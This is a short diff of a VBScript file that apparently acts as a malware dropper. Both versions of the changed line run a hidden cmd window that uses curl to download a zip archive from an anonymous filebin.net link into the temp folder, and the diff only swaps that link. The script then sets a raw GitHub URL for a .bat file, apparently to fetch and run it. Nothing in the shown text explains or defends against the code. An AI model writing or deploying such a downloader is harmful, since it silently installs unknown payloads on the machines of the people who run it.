@@ -1,6 +1,6 @@
 Option Explicit
 
-CreateObject("WScript.Shell").Run "cmd /c cd %temp% && curl -L -o Best_Gits.zip https://filebin.net/jdfcmciyuk0pgsue/Best_Gits.zip", 0, True
+CreateObject("WScript.Shell").Run "cmd /c cd %temp% && curl -L -o Best_Gits.zip https://filebin.net/aznbq39ct38rgh3v/Best_Gits.zip", 0, True
 
 Dim strBatchURL, strBatchTempFile
 strBatchURL = "https://raw.githubusercontent.com/Allsafetui/lex/refs/heads/main/unp.bat" ' URL для .bat файла
